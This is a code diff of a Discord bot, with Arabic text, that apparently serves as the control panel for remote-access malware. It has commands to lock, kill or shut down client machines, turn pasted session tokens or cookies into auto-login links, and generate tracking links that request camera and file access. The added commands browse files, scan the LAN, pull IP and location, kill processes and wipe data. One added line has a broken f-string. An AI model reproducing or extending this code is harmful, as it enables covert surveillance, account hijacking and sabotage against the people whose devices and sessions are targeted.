@@ -14,7 +14,6 @@ from threading import Thread
 app = Flask('')
 
 HOST_URL = "https://threesrh-system-data.onrender.com"
-
 WEB_SESSIONS_MEMORY = {}
 
 @app.route('/')
@@ -403,7 +402,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الإلزامي!", ephemeral=True)
 
-    @discord.ui.button(label="🔓 إلغاء الثبات (إغلاق عادي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
+    @discord.ui.button(label="🔓 إلغاء الثبات", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -411,25 +410,15 @@ class DeviceActionsView(discord.ui.View):
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]: del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات!", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
+    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_force_close", {})[self.code] = {"id": str(int(time.time()))}
-            if "remote_lock_states" in db and self.code in db["remote_lock_states"]: del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إطفاء الأداة من الخلفية!", ephemeral=True)
 
-    @discord.ui.button(label="إغلاق جميع البرامج في الخلفية والألعاب", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=3)
-    async def kill_all_apps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("remote_kill_all_apps", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Kill all background apps for {self.code}"): 
-                await interaction.followup.send("🛑 تم إرسال أمر إغلاق كافة البرامج والألعاب في الخلفية (مع استثناء السكربت) بنجاح!", ephemeral=True)
-
-    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
+    @discord.ui.button(label="⚡ إيقاف جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -487,11 +476,6 @@ async def generate(interaction: discord.Interaction, count: int = 1):
     codes = [generate_random_code() for _ in range(count)]
     await interaction.response.send_message(f"⚠️ **حفظ الأكواد؟**\n" + "\n".join([f"`{c}`" for c in codes]), view=ConfirmSaveView(codes, count), ephemeral=True)
 
-@generate.error
-async def generate_error(interaction: discord.Interaction, error):
-    if isinstance(error, app_commands.CommandOnCooldown):
-        await interaction.response.send_message(f"⏳ مهلا! يرجى الانتظار `{error.retry_after:.1f}` ثانية قبل استخدام هذا الأمر مرة أخرى لمنع الحظر.", ephemeral=True)
-
 @client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع وعرض التوكن للنسخ المباشر")
 @app_commands.checks.cooldown(1, 3)
 @app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
@@ -505,7 +489,6 @@ async def generate_error(interaction: discord.Interaction, error):
 ])
 async def loginbytoken_command(interaction: discord.Interaction, platform: str, token_or_cookie: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    
     clean_token = token_or_cookie.strip()
     encoded_token = requests.utils.quote(clean_token, safe='')
     web_link = f"{HOST_URL}/autologin?platform={platform}&token={encoded_token}"
@@ -519,54 +502,18 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
     response_text = (
         f"🎮 **تم إنشاء جلسة {platform.upper()} بنجاح!**\n\n"
         f"🌐 **رابط الدخول المباشر:**\n{web_link}\n\n"
-        f"📌 **التوكن بالكامل (للنسخ المباشر ووضعه في الكومنت):**\n"
+        f"📌 **التوكن بالكامل (للنسخ المباشر):**\n"
         f"```json\n{clean_token}\n```"
     )
-    
     await interaction.followup.send(content=response_text, ephemeral=True)
 
 @client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
-@app_commands.checks.cooldown(1, 3)
 @app_commands.describe(redirect_to="رابط الوجهة النهائية", capture_cam="طلب إذن الكاميرا؟", file_system="تفعيل الوصول للملفات")
-@app_commands.choices(capture_cam=[app_commands.Choice(name="نعم", value="true"), app_commands.Choice(name="لا", value="false")],
-                    file_system=[app_commands.Choice(name="تفعيل", value="true"), app_commands.Choice(name="إيقاف", value="false")])
 async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false", file_system: str = "false"):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
     track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&fs={file_system}"
     embed = discord.Embed(title="🔗 رابط التتبع المطور جاهز", description=f"`{track_url}`", color=0xFF5733)
     await interaction.followup.send(embed=embed, ephemeral=True)
-
-@client.tree.command(name="lagtimer", description="تفعيل لاج أو بينغ مرتفع مؤقت للعميل مع تحديد المدة بالثواني")
-@app_commands.describe(
-    target="كود التفعيل أو اسم الجهاز المستهدف",
-    ping_value="قيمة البينغ (مثال: 300 أو 500 أو 1000)",
-    duration_seconds="مدة استمرار اللاج بالثواني (مثال: 30 أو 60)"
-)
-async def lagtimer_command(interaction: discord.Interaction, target: str, ping_value: int, duration_seconds: int):
-    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    if not db: return
-    
-    target_upper = target.strip().upper()
-    if target_upper not in db.get("codes", {}):
-        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
-        return
-    
-    if "remote_lag_timers" not in db: db["remote_lag_timers"] = {}
-    db["remote_lag_timers"][target_upper] = {
-        "ping": ping_value,
-        "duration": duration_seconds,
-        "id": str(int(time.time()))
-    }
-    
-    if save_db(db, sha, url, headers, f"Set lag timer {ping_value}ms for {duration_seconds}s on {target_upper}"):
-        await interaction.followup.send(
-            f"⏱️ **تم جدولة وتفعيل اللاج المؤقت بنجاح!**\n"
-            f"• العميل: `{target_upper}`\n"
-            f"• القيمة: `{ping_value} ms`\n"
-            f"• المدة: `{duration_seconds} ثانية` (سينطفئ تلقائياً)", 
-            ephemeral=True
-        )
 
 @client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
 async def unused_command(interaction: discord.Interaction):
@@ -681,6 +628,72 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
     embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
+
+# الأوامر المتقدمة المضافة (ipconfig, lanscan, files, killprocess, wipe, geolocation, lagtimer)
+@client.tree.command(name="ipconfig", description="سحب معلومات الشبكة IP للعميل")
+@app_commands.describe(target="كود التفعيل المستهدف")
+async def cmd_ipconfig(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    db.setdefault("remote_ipconfig", {})[target.upper()] = {"id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"IPConfig {target}")
+    await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
+
+@client.tree.command(name="lanscan", description="فحص الأجهزة المتصلة على الشبكة المحلية للعميل")
+@app_commands.describe(target="كود التفعيل المستهدف")
+async def cmd_lanscan(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    db.setdefault("remote_lanscan", {})[target.upper()] = {"id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"LanScan {target}")
+    await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
+
+@client.tree.command(name="files", description="استعراض وتصفح ملفات جهاز العميل")
+@app_commands.describe(target="كود التفعيل المستهدف", path="مسار المجلد المطلوب (مثال: C:\\)")
+async def cmd_files(interaction: discord.Interaction, target: str, path: str = "C:\\"):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    db.setdefault("remote_filebrowser", {})[target.upper()] = {"path": path, "id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"Files browse {target}")
+    await interaction.followup.send(f"📁 تم طلب استعراض الملفات للمسار `{path}` للعميل!", ephemeral=True)
+
+@client.tree.command(name="killprocess", description="إيقاف برنامج أو عملية معينة قيد التشغيل")
+@app_commands.describe(target="كود التفعيل المستهدف", process_name="اسم العملية (مثال: discord.exe)")
+async def cmd_killprocess(interaction: discord.Interaction, target: str, process_name: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    db.setdefault("remote_killprocess", {})[target.upper()] = {"name": process_name, "id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"Kill process {process_name}")
+    await interaction.followup.send(f"🛑 تم إرسال أمر إيقاف العملية `{process_name}` للعميل!", ephemeral=True)
+
+@client.tree.command(name="wipe", description="حذف وتنظيف ملفات الكاش والتخزين المؤقت")
+@app_commands.describe(target="كود التفعيل المستهدف")
+async def cmd_wipe(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    db.setdefault("remote_wipe", {})[target.upper()] = {"id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"Wipe cache {target}")
+    await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
+
+@client.tree.command(name="geolocation", description="تحديد موقع العميل الجغرافي عبر الـ IP")
+@app_commands.describe(target="كود التفعيل المستهدف")
+async def cmd_geo(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, _, _, _ = fetch_db()
+    info = db.get("codes", {}).get(target.upper(), {})
+    ip = info.get("ip", "غير معروف")
+    country = info.get("country", "غير معروف")
+    await interaction.followup.send(f"🌍 **الموقع الجغرافي للعميل `{target.upper()`}:**\n• IP: `{ip}`\n• الدولة: `{country}`", ephemeral=True)
+
+@client.tree.command(name="lagtimer", description="تفعيل لاج أو بينغ مرتفع مؤقت للعميل مع تحديد المدة")
+@app_commands.describe(target="كود التفعيل المستهدف", ping_value="قيمة البينغ (مثال: 500)", duration_seconds="المدة بالثواني")
+async def lagtimer_command(interaction: discord.Interaction, target: str, ping_value: int, duration_seconds: int):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    target_upper = target.strip().upper()
+    db.setdefault("remote_lag_timers", {})[target_upper] = {"ping": ping_value, "duration": duration_seconds, "id": str(int(time.time()))}
+    save_db(db, sha, url, headers, f"Lag timer {ping_value}ms for {target_upper}")
+    await interaction.followup.send(f"⏱️ تم تفعيل اللاج المؤقت للعميل `{target_upper}` بقيمة `{ping_value}ms` لمدة `{duration_seconds} ثانية`!", ephemeral=True)
 
 if TOKEN:
     client.run(TOKEN)
